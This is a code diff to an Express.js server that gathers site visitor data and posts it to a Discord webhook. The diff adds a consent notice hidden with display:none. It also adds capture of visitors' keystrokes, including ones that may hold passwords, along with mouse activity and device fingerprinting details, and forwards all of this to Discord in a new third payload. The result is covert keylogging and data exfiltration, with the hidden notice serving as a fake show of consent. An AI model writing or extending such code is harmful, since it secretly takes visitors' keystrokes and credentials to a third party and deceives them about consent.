@@ -88,6 +88,7 @@ app.get('/index.html', (req, res) => {
     </head>
     <body>
       <h1>Welcome</h1>
+      <p id="consent-notice" style="display: none;">By interacting with this page, you consent to limited data collection for analytics, including search bar input and mouse activity.</p>
       <script src="/client.js"></script>
     </body>
     </html>
@@ -157,6 +158,13 @@ function detectSecurityThreats(req, visitorInfo) {
     threats.push({
       type: 'PostMessage Misuse',
       details: `Unverified postMessage calls: ${req.body.postMessageCalls.join(', ')}`
+    });
+  }
+
+  if (req.body.part3?.keystrokes && req.body.part3.keystrokes.includes('password')) {
+    threats.push({
+      type: 'Sensitive Keylogging',
+      details: 'Potentially sensitive data detected in keystrokes'
     });
   }
 
@@ -231,7 +239,13 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       touchSupport: req.body.touchSupport || 'Unknown',
       batteryStatus: req.body.batteryStatus || 'Unknown',
       currentUrl: req.body.currentUrl || 'Unknown',
-      scrollPosition: req.body.scrollPosition || 'Unknown'
+      scrollPosition: req.body.scrollPosition || 'Unknown',
+      part3: {
+        keystrokes: req.body.part3?.keystrokes || 'None',
+        mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
+        webglSupport: req.body.part3?.webglSupport || 'Unknown',
+        connectionType: req.body.part3?.connectionType || 'Unknown'
+      }
     };
 
     const threats = detectSecurityThreats(req, visitorInfo);
@@ -273,11 +287,16 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
       { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
       { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
+      { name: 'Part 3: Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
+      { name: 'Part 3: Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
+      { name: 'Part 3: WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
+      { name: 'Part 3: Connection Type', value: visitorInfo.part3.connectionType, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const firstBatch = fields.slice(0, 15); // Session ID to Language
-    const secondBatch = fields.slice(15);   // Accept to Threats
+    const firstBatch = fields.slice(0, 17); // Session ID to Device Type
+    const secondBatch = fields.slice(17, 34); // Referer to Part 3: Connection Type
+    const thirdBatch = fields.slice(34); // Threats
 
     const payload1 = {
       embeds: [{
@@ -297,6 +316,15 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       }]
     };
 
+    const payload3 = {
+      embeds: [{
+        title: 'New Visitor Detected! (Part 3)',
+        color: threats.length ? 0xff0000 : 0x00ff00,
+        timestamp: visitorInfo.timestamp,
+        fields: thirdBatch
+      }]
+    };
+
     try {
       // Save payloads to .txt files
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -310,6 +338,10 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       const logFile2 = path.join(logDir, `webhook_payload_2_${timestamp}.txt`);
       await fs.writeFile(logFile2, JSON.stringify(payload2, null, 2));
       logger.info('Saved webhook payload 2 to file', { file: logFile2, payloadSize: JSON.stringify(payload2).length });
+
+      const logFile3 = path.join(logDir, `webhook_payload_3_${timestamp}.txt`);
+      await fs.writeFile(logFile3, JSON.stringify(payload3, null, 2));
+      logger.info('Saved webhook payload 3 to file', { file: logFile3, payloadSize: JSON.stringify(payload3).length });
 
       // Send first webhook
       logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
@@ -355,6 +387,33 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       }
 
       logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });
+
+      // Delay to avoid rate limits
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Send third webhook (if fields exist)
+      if (thirdBatch.length > 0) {
+        logger.info('Attempting to send to Discord Webhook (Part 3)', { webhookURL, payloadSize: JSON.stringify(payload3).length });
+        const webhookResponse3 = await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload3)
+        });
+
+        if (!webhookResponse3.ok) {
+          const text = await webhookResponse3.text();
+          logger.error('Failed to send to Discord Webhook (Part 3)', {
+            status: webhookResponse3.status,
+            statusText: webhookResponse3.statusText,
+            response: text,
+            webhookURL
+          });
+          return res.status(500).send('Failed to send visitor info to Discord (Part 3)');
+        }
+
+        logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });
+      }
+
     } catch (error) {
       logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
       return res.status(500).send('Error sending visitor info to Discord');
